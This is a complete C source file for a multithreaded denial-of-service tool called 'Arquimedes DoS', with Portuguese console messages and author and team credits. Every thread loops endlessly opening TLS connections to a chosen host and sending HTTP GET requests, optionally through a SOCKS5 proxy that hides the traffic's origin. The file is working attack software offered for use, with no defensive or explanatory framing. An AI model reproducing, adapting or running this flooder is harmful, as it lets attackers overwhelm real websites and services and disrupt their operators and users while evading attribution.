#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>

char *target_host = NULL;
int target_port = 443;
int threads = 50;
char *proxy_ip = NULL;
int proxy_port = 0;

int connect_via_socks5(const char *proxy_ip, int proxy_port, const char *dest_host, int dest_port) {
    int sockfd;
    struct sockaddr_in proxy_addr;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) return -1;

    memset(&proxy_addr, 0, sizeof(proxy_addr));
    proxy_addr.sin_family = AF_INET;
    proxy_addr.sin_port = htons(proxy_port);
    if (inet_pton(AF_INET, proxy_ip, &proxy_addr.sin_addr) <= 0) {
        close(sockfd);
        return -1;
    }

    if (connect(sockfd, (struct sockaddr*)&proxy_addr, sizeof(proxy_addr)) < 0) {
        close(sockfd);
        return -1;
    }

    unsigned char buf[512];
    int n;
    unsigned char greeting[3] = {0x05, 0x01, 0x00};
    if (write(sockfd, greeting, 3) != 3) {
        close(sockfd);
        return -1;
    }

    n = read(sockfd, buf, 2);
    if (n != 2 || buf[0] != 0x05 || buf[1] != 0x00) {
        close(sockfd);
        return -1;
    }

    int host_len = strlen(dest_host);
    int req_len = 7 + host_len;
    unsigned char *req = malloc(req_len);
    if (!req) {
        close(sockfd);
        return -1;
    }

    req[0] = 0x05;
    req[1] = 0x01;
    req[2] = 0x00;
    req[3] = 0x03;
    req[4] = (unsigned char)host_len;
    memcpy(&req[5], dest_host, host_len);
    req[5 + host_len] = (unsigned char)(dest_port >> 8);
    req[6 + host_len] = (unsigned char)(dest_port & 0xFF);

    if (write(sockfd, req, req_len) != req_len) {
        free(req);
        close(sockfd);
        return -1;
    }
    free(req);

    n = read(sockfd, buf, 10);
    if (n < 7 || buf[1] != 0x00) {
        close(sockfd);
        return -1;
    }

    return sockfd;
}

void* flood(void* arg) {
    SSL_library_init();
    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    int packet_count = 0;

    while (1) {
        int sock;
        if (proxy_ip && proxy_port) {
            sock = connect_via_socks5(proxy_ip, proxy_port, target_host, target_port);
            if (sock < 0) continue;
        } else {
            struct hostent *host = gethostbyname(target_host);
            struct sockaddr_in addr;
            sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock < 0) continue;
            addr.sin_family = AF_INET;
            addr.sin_port = htons(target_port);
            addr.sin_addr = *((struct in_addr*) host->h_addr);
            if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
                close(sock);
                continue;
            }
        }

        SSL *ssl = SSL_new(ctx);
        SSL_set_fd(ssl, sock);
        if (SSL_connect(ssl) != -1) {
            char req[256];
            snprintf(req, sizeof(req), "GET / HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\n\r\n", target_host);
            SSL_write(ssl, req, strlen(req));
            packet_count++;
            printf("Arquimedes-DoS -> %d pacote(s) enviado(s) para %s!\n", packet_count, target_host);
        }
        SSL_shutdown(ssl);
        SSL_free(ssl);
        close(sock);
    }

    SSL_CTX_free(ctx);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 7) {
        printf("Usage: ./arquimedes -I <host> -p <port> -t <threads> [-l <proxy_ip> -lp <proxy_port>]\n");
        return 1;
    }

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-I") == 0 && i + 1 < argc) target_host = argv[++i];
        else if (strcmp(argv[i], "-p") == 0 && i + 1 < argc) target_port = atoi(argv[++i]);
        else if (strcmp(argv[i], "-t") == 0 && i + 1 < argc) threads = atoi(argv[++i]);
        else if (strcmp(argv[i], "-l") == 0 && i + 1 < argc) proxy_ip = argv[++i];
        else if (strcmp(argv[i], "-lp") == 0 && i + 1 < argc) proxy_port = atoi(argv[++i]);
    }

    if (!target_host) {
        printf("Host não definido\n");
        return 1;
    }

    printf("𖤛 Arquimedes DoS iniciado por Jhon Lamdenberguer 𖤛\n");
    printf("🪓 By - Jhon Lamdenberguer\n💻 Team - Família Flodder Techno\n📱 Ferramenta - Arquimedes DoS\n\n");

    pthread_t tid[threads];
    for (int i = 0; i < threads; i++) {
        pthread_create(&tid[i], NULL, flood, NULL);
        usleep(10000);
    }
    for (int i = 0; i < threads; i++) pthread_join(tid[i], NULL);

    return 0;
}
